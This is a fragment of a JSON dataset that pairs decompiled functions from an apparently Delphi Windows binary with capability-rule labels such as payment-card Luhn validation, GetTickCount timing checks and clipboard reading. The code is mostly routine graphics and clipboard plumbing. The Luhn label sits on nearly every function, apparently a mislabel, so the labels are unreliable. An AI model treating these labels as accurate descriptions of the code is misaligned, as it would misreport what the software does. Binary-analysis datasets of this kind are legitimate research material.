            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d090(uint param_1, uint param_2)\n\n{\n    fcn.0041d040(*0x461698, *0x46169c, param_2, *0x4616a4);\n    return;\n}\n",
        "token_count": 59
    },
    "0041d20c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041d20c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    sub.kernel32.dll_InitializeCriticalSection_1();\n    iVar1 = fcn.0041c71c();\n    *(in_EAX + 0xc) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x41da4c;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.0041cc48();\n    *(in_EAX + 0x10) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x41da6c;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    iVar1 = fcn.0041cf14();\n    *(in_EAX + 0x14) = iVar1;\n    *(iVar1 + 0xc) = in_EAX;\n    *(iVar1 + 8) = 0x41da8c;\n    *(iVar1 + 0x14) = in_EAX + 0x38;\n    *(in_EAX + 0x20) = 0xcc0020;\n    *(in_EAX + 8) = *0x41d2cc;\n    fcn.00413e48();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = in_EAX + 0x38;\n    }\n    return in_EAX;\n}\n",
        "token_count": 433
    },
    "0041d3b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d3b4(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *arg_8h_00;\n    uint var_14h;\n    int32_t var_4h;\n    \n    if (arg_8h != NULL) {\n        cVar1 = (**(*arg_8h + 0x1c))();\n        if (cVar1 == '\\0') {\n            (**(*in_EAX + 0x10))();\n            fcn.0041d8d8();\n            fcn.0041d0b4();\n            uVar2 = fcn.0041c430();\n            sub.gdi32.dll_SetBkColor(in_EAX[1], uVar2);\n            uVar2 = fcn.0041c430();\n            sub.gdi32.dll_SetTextColor(in_EAX[1], uVar2);\n            iVar3 = (**(*arg_8h + 0x20))();\n            iVar3 = iVar3 + var_4h;\n            arg_8h_00 = &var_14h;\n            (**(*arg_8h + 0x2c))();\n            fcn.00412730(arg_8h_00, iVar3);\n            (**(*arg_8h + 0x14))();\n            (**(*in_EAX + 0xc))();\n        }\n    }\n    return;\n}\n",
        "token_count": 327
    },
    "0041d664": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041d664(void)\n\n{\n    ulong uStack16;\n    \n    fcn.0041d620();\n    return uStack16;\n}\n",
        "token_count": 35
    },
    "0041d680": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041d680(void)\n\n{\n    uint uStack12;\n    \n    fcn.0041d620();\n    return CONCAT44(uStack12, uStack12);\n}\n",
        "token_count": 41
    },
    "0041d770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d770(uint param_1, uint *param_2)\n\n{\n    fcn.0041d538(*param_2, param_2[1]);\n    return;\n}\n",
        "token_count": 46
    },
    "0041d884": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d884(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack16;\n    uint uStack12;\n    \n    if (param_2 != *(in_EAX + 4)) {\n        if (*(in_EAX + 4) != 0) {\n            fcn.0041d824();\n            fcn.0041d74c();\n            *(in_EAX + 0x18) = uStack16;\n            *(in_EAX + 0x1c) = uStack12;\n            *(in_EAX + 4) = 0;\n            *(in_EAX + 8) = *(in_EAX + 8) & 0xfe;\n        }\n        if (param_2 != 0) {\n            *(in_EAX + 8) = *(in_EAX + 8) | 1;\n            *(in_EAX + 4) = param_2;\n            fcn.0041d770();\n        }\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "0041db54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041db54(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffecc;\n    uint uStack280;\n    uint uStack276;\n    uchar *puStack272;\n    uint var_104h;\n    uint var_100h;\n    \n    puStack272 = &stack0xfffffffc;\n    uStack276 = 0x41dbf0;\n    uStack280 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack280;\n    iVar1 = sub.kernel32.dll_GetLastError();\n    if (iVar1 != 0) {\n        in_stack_fffffecc = 0x1000;\n        iVar1 = sub.kernel32.dll_FormatMessageA(0x1000, 0, iVar1, 0x400, &var_100h, 0x100, 0);\n        if (iVar1 != 0) {\n            fcn.00404218();\n            fcn.0040b538();\n            fcn.004039e4();\n            goto code_r0x0041dbd7;\n        }\n    }\n    fcn.0041db00();\ncode_r0x0041dbd7:\n    *in_FS_OFFSET = in_stack_fffffecc;\n    fcn.00403fa8(0x41dbf7);\n    return;\n}\n",
        "token_count": 295
    },
    "0041dd8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0041dd8c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = in_EAX * param_2 + (param_1 - 1U) & ~(param_1 - 1U);\n    if (uVar1 < 0) {\n        uVar1 = uVar1 + 7;\n    }\n    return in_EAX * param_2 & 0xffffffff00000000U | uVar1 >> 3;\n}\n",
        "token_count": 129
    },
    "0041e06c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e06c(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar4 = *param_2 + -1;\n    if (0 < iVar4) {\n        iVar3 = 1;\n        do {\n            puVar1 = in_EAX + iVar3 * 4;\n            puVar2 = in_EAX + iVar3 * 3;\n            puVar2[2] = puVar1[2];\n            puVar2[1] = puVar1[1];\n            *puVar2 = *puVar1;\n            iVar3 = iVar3 + 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n    }\n    if (*param_2 < 0x100) {\n        fcn.00402c64();\n        *param_2 = 0x100;\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "0041e13c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041e13c(void)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffbb8;\n    uint var_424h;\n    uint var_420h;\n    uint uStack1056;\n    uint uStack1052;\n    uchar *puStack1048;\n    uint uStack1044;\n    uint var_408h;\n    uchar var_404h [28];\n    int32_t lppe;\n    uint var_3e4h;\n    uchar auStack996 [988];\n    uint hdc;\n    \n    uStack1044 = 0x41e168;\n    fcn.004028b8();\n    uStack1044 = 0;\n    puStack1048 = 0x41e16f;\n    hdc = sub.user32.dll_GetDC();\n    uStack1052 = 0x41e239;\n    uStack1056 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffbe0;\n    puStack1048 = &stack0xfffffffc;\n    iVar1 = sub.gdi32.dll_GetDeviceCaps();\n    if (0xf < iVar1) {\n        sub.gdi32.dll_GetSystemPaletteEntries(hdc, 0, 8, &stack0xfffffbf8);\n        in_stack_fffffbb8 = hdc;\n        if (lppe == 0xc0c0c0) {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 1, &fcn.0041e13c::lppe);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -7, 7, &stack0xfffffc1c);\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, 7, 1, &fcn.0041e13c::var_3e4h);\n        }\n        else {\n            sub.gdi32.dll_GetSystemPaletteEntries(hdc, iVar1 + -8, 8, &fcn.0041e13c::var_3e4h);\n        }\n    }\n    *in_FS_OFFSET = in_stack_fffffbb8;\n    sub.user32.dll_ReleaseDC(0, hdc, 0x41e240);\n    return;\n}\n",
        "token_count": 484
    },
    "0041e5ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041e5ac(int32_t arg_8h)\n\n{\n    uint8_t *in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint8_t *in_EDX;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar4 = *in_EDX - **(arg_8h + 8);\n    uVar5 = in_EDX[1] - *(*(arg_8h + 8) + 4);\n    uVar6 = *in_EAX - **(arg_8h + 8);\n    uVar1 = in_EAX[1] - *(*(arg_8h + 8) + 4);\n    if ((((uVar6 ^ uVar6 >> 0x1f) - (uVar6 >> 0x1f) < (uVar4 ^ uVar4 >> 0x1f) - (uVar4 >> 0x1f)) ||\n        (((0 < uVar4 && (uVar6 < uVar4)) ||\n         (iVar2 = (uVar1 ^ uVar1 >> 0x1f) - (uVar1 >> 0x1f),  iVar2 < (uVar5 ^ uVar5 >> 0x1f) - (uVar5 >> 0x1f))))) ||\n       ((0 < uVar5 && (uVar1 < uVar5)))) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = CONCAT31(iVar2 >> 8, 1);\n    }\n    return uVar3;\n}\n",
        "token_count": 389
    },
    "0041e944": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint16_t fcn.0041e944(void)\n\n{\n    uint16_t *in_EAX;\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    \n    uVar2 = 0;\n    puVar1 = in_EAX + 10;\n    for (; in_EAX < puVar1; in_EAX = in_EAX + 1) {\n        uVar2 = uVar2 ^ *in_EAX;\n    }\n    return uVar2;\n}\n",
        "token_count": 107
    },
    "0041ea40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041ea40(uint arg_8h)\n\n{\n    uint *in_ECX;\n    int32_t *in_EDX;\n    uint var_28h;\n    uint var_1ah;\n    uint var_14h;\n    int32_t var_8h;\n    \n    fcn.0041e95c();\n    if (var_1ah < 9) {\n        if (var_8h == 0) {\n            *in_EDX = (1 << (var_1ah & 0x1f)) * 4 + 0x28;\n        }\n        else {\n            *in_EDX = var_8h * 4 + 0x28;\n        }\n    }\n    else {\n        *in_EDX = 0x28;\n        if ((var_1ah._2_1_ & 3) != 0) {\n            *in_EDX = *in_EDX + 0xc;\n        }\n    }\n    *in_ECX = var_14h;\n    return;\n}\n",
        "token_count": 236
    },
    "0041ed7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041ed7c(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 131
    },
    "0041ee24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ee24(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *(*in_EAX + 0x44);\n    fcn.0041edcc(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 102
    },
    "0041f15c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f15c(uint param_1, char param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uVar2;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (param_2 != '\\0') {\n        puStack48 = 0x41f173;\n        fcn.0040357c();\n    }\n    uStack52 = 0x41f239;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    fcn.00403228();\n    uVar2 = 0;\n    uVar1 = *0x41b804;\n    fcn.00405b0c();\n    fcn.0041f2dc(uVar1, uVar2);\n    uVar2 = 0;\n    uVar1 = *0x41b804;\n    fcn.00405b0c();\n    fcn.0041f2dc(uVar1, uVar2);\n    uVar2 = 0;\n    uVar1 = *0x41ba88;\n    fcn.00405b0c();\n    fcn.0041f2dc(uVar1, uVar2);\n    uVar2 = 0;\n    uVar1 = *0x41b944;\n    fcn.00405b0c();\n    fcn.0041f2dc(uVar1, uVar2);\n    *in_FS_OFFSET = uVar1;\n    fcn.00403fcc(0x41f240);\n    return;\n}\n",
        "token_count": 392
    },
    "0041f2dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f2dc(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41f35f;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puVar1 = fcn.00404d50();\n    fcn.00407c74();\n    fcn.00403ffc();\n    *puVar1 = arg_8h;\n    fcn.00403ffc();\n    puVar1[3] = arg_ch;\n    fcn.00413a08();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41f366;\n    uStack36 = 0x41f35e;\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 240
    },
    "0041f6e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041f6e4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    uVar1 = fcn.00403228();\n    *(in_EAX + 4) = uVar1;\n    uVar1 = fcn.00403228();\n    *(in_EAX + 8) = uVar1;\n    fcn.0041f790();\n    fcn.0041f790();\n    fcn.0041f790();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 213
    },
    "0041f790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041f790(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x41f7ab;\n    fcn.00413a08();\n    uStack32 = 0x41f7d4;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack28 = &stack0xfffffffc;\n    fcn.00413a08();\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 145
    },
    "0041f838": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041f838(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_2 = extraout_DL;\n    }\n    fcn.00403228();\n    fcn.0041f7f8();\n    fcn.0041f818();\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 150
    },
    "0041fa08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041fa08(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStackY68;\n    uint uStackY64;\n    uchar *puStackY60;\n    uint in_stack_ffffffc8;\n    uint *arg_ch;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack44 = 0x41fb2c;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    fcn.004084e4();\n    fcn.00404508();\n    iVar1 = fcn.0041f370();\n    if (iVar1 == 0) {\n        var_10h = var_4h;\n        var_ch._0_1_ = 0xb;\n        arg_ch = &fcn.0041fa08::var_10h;\n        in_stack_ffffffc8 = 0;\n        puStackY60 = 0x41fa75;\n        fcn.00405b0c();\n        puStackY60 = 0x41fa84;\n        fcn.0040b574(in_stack_ffffffc8, arg_ch);\n        puStackY60 = 0x41fa89;\n        iVar1 = fcn.004039e4();\n    }\n    puStackY60 = 0x41fa8e;\n    piVar2 = (**(iVar1 + 0x48))();\n    uStackY64 = 0x41facb;\n    uStackY68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    piVar2[7] = in_EAX;\n    puStackY60 = &stack0xfffffffc;\n    var_8h = piVar2;\n    iVar1 = fcn.0040346c();\n    piVar2[6] = iVar1;\n    (**(*var_8h + 0x4c))();\n    *in_FS_OFFSET = uStackY68;\n    puStackY60 = 0x41faea;\n    fcn.00403258();\n    piVar2 = var_8h;\n    *(in_EAX + 0xc) = var_8h;\n    var_8h[5] = in_EAX;\n    puStackY60 = 0x41fafe;\n    iVar1 = fcn.0040346c();\n    piVar2[4] = iVar1;\n    puStackY60 = 0x41fb0e;\n    fcn.00403454();\n    *in_FS_OFFSET = in_stack_ffffffc8;\n    uStack48 = 0x41fb33;\n    fcn.00403fa8();\n    fcn.00403fa8();\n    return;\n}\n",
        "token_count": 688
    },
    "0041fe04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041fe04(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0x41fd2c;\n    fcn.0041fd88(&stack0xfffffffc);\n    (**(*param_2 + 8))(uVar1);\n    return;\n}\n",
        "token_count": 91
    },
    "004202a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004202a0(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack132;\n    uint uStack128;\n    uchar *puStack124;\n    uint var_68h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint cbBuffer;\n    uint lpData;\n    \n    puStack124 = 0x4202b4;\n    fcn.0042020c();\n    puStack124 = 0x4202c3;\n    fcn.004159e8();\n    if (var_40h != 0x464d4520) {\n        puStack124 = 0x4202d1;\n        fcn.0041daf4();\n    }\n    puStack124 = 0x4202d9;\n    uVar2 = fcn.004026bc();\n    iVar1 = *(in_EAX + 0x28);\n    uStack128 = 0x420360;\n    uStack132 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff7c;\n    puStack124 = &stack0xfffffffc;\n    fcn.004028b8();\n    fcn.004159e8();\n    iVar3 = sub.gdi32.dll_SetEnhMetaFileBits(cbBuffer, uVar2);\n    *(iVar1 + 8) = iVar3;\n    if (iVar3 == 0) {\n        fcn.0041daf4();\n    }\n    *(iVar1 + 0x18) = 0;\n    *(iVar1 + 0xc) = var_48h - var_50h;\n    *(iVar1 + 0x10) = var_44h - var_4ch;\n    *(in_EAX + 0x2c) = 1;\n    *in_FS_OFFSET = cbBuffer;\n    uStack132 = 0x420367;\n    fcn.004026dc();\n    return;\n}\n",
        "token_count": 473
    },
    "004204f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004204f0(void)\n\n{\n    uchar uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar uVar2;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    puStack40 = &stack0xfffffffc;\n    uStack32 = 0x420597;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = 1;\n    uStack44 = 0x420575;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fcn.004084e4();\n    fcn.0040c24c();\n    fcn.004043b4();\n    if (uVar2) {\n        *(in_EAX + 0x2c) = 0;\n    }\n    fcn.0041f048();\n    *in_FS_OFFSET = uStack48;\n    *(in_EAX + 0x2c) = uVar1;\n    return;\n}\n",
        "token_count": 301
    },
    "00420a6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid fcn.00420a6c(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_64h;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    \n    iVar2 = sub.user32.dll_GetClipboardData(0xe);\n    if (iVar2 == 0) {\n        fcn.0041dac4();\n    }\n    fcn.0042020c();\n    iVar1 = in_EAX[10];\n    uVar3 = sub.gdi32.dll_CopyEnhMetaFileA(iVar2, 0);\n    *(iVar1 + 8) = uVar3;\n    sub.gdi32.dll_GetEnhMetaFileHeader(*(iVar1 + 8), 100, &var_64h);\n    *(iVar1 + 0xc) = var_44h - var_4ch;\n    *(iVar1 + 0x10) = var_40h - var_48h;\n    *(iVar1 + 0x18) = 0;\n    *(in_EAX + 0xb) = 1;\n    iVar2 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar2 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 323
    },
    "00420ce8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00420ce8(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040357c();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.0041d20c();\n    *(in_EAX + 0x58) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004035d4();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 169
    },
    "00420fa8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420fa8(int32_t param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack1080;\n    uint uStack1076;\n    uchar *puStack1072;\n    uint uStack1068;\n    uint uStack1064;\n    uint uStack1060;\n    uint uStack1056;\n    uint var_410h;\n    uint hgdiobj;\n    uint hdc;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((in_EAX != 0) && (*(param_1 + 0x26) < 9)) {\n        uStack1056 = 0x420fde;\n        var_4h = param_2;\n        iVar1 = fcn.0041e390();\n        if (iVar1 != 0) {\n            uStack1056 = 0;\n            uStack1060 = 0x420feb;\n            uStack1060 = sub.user32.dll_GetDC();\n            uStack1064 = 0x420ff7;\n            var_8h = uStack1060;\n            uStack1068 = sub.gdi32.dll_CreateCompatibleDC();\n            puStack1072 = 0x421004;\n            hdc = uStack1068;\n            hgdiobj = sub.gdi32.dll_SelectObject();\n            uStack1076 = 0x421057;\n            uStack1080 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffbc8;\n            uVar2 = hdc;\n            puStack1072 = &stack0xfffffffc;\n            sub.gdi32.dll_SetDIBColorTable(hdc, 0, iVar1, &fcn.00420fa8::var_410h);\n            *in_FS_OFFSET = uVar2;\n            sub.gdi32.dll_SelectObject(hdc, hgdiobj, 0x42105e);\n            sub.gdi32.dll_DeleteDC(hdc);\n            sub.user32.dll_ReleaseDC(0, var_8h);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 466
    },
    "00421a28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421a28(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff80;\n    uint uStack116;\n    uint uStack112;\n    uchar *puStack108;\n    uint uStack104;\n    uint var_58h;\n    int32_t var_4h;\n    \n    var_4h = in_EAX;\n    if (param_2 != 0) {\n        uStack104 = 0x421a46;\n        cVar1 = fcn.004033e4();\n        if (cVar1 == '\\0') {\n            uStack104 = 0x421b11;\n            fcn.00414120();\n            return;\n        }\n    }\n    uStack104 = 0x4638a8;\n    puStack108 = 0x421a58;\n    sub.kernel32.dll_EnterCriticalSection_1();\n    uStack112 = 0x421ae0;\n    uStack116 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff8c;\n    if (param_2 == 0) {\n        puStack108 = &stack0xfffffffc;\n        fcn.00402c64();\n        in_stack_ffffff80 = 0;\n        fcn.004223cc(0, 0, &fcn.00421a28::var_58h);\n    }\n    else {\n        puStack108 = &stack0xfffffffc;\n        fcn.00420edc();\n        fcn.00420ee0();\n        *(var_4h + 0x28) = *(param_2 + 0x28);\n        *(var_4h + 0x21) = *(param_2 + 0x21);\n        *(var_4h + 0x34) = *(param_2 + 0x34);\n        *(var_4h + 0x38) = *(param_2 + 0x38);\n    }\n    *in_FS_OFFSET = in_stack_ffffff80;\n    sub.kernel32.dll_LeaveCriticalSection_1(0x4638a8, 0x421ae7);\n    return;\n}\n",
        "token_count": 485
    },
    "00421b18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
